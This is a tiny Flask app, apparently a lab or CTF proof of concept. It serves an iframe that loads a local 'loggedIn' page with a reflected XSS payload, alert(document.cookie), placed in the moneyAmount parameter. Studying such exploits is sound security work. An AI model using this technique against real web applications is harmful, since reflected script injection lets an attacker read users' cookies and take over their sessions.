from flask import Flask, render_template_string, request, make_response

app = Flask(__name__)

@app.route('/', methods=["GET"])
def index():
    url = "http://127.0.0.1:51818/loggedIn?username=&moneyAmount=<script>alert(document.cookie)</script>"
    return make_response(render_template_string(f"<iframe src='{url}'>"))

if __name__=="__main__":
    app.run(debug=True)
    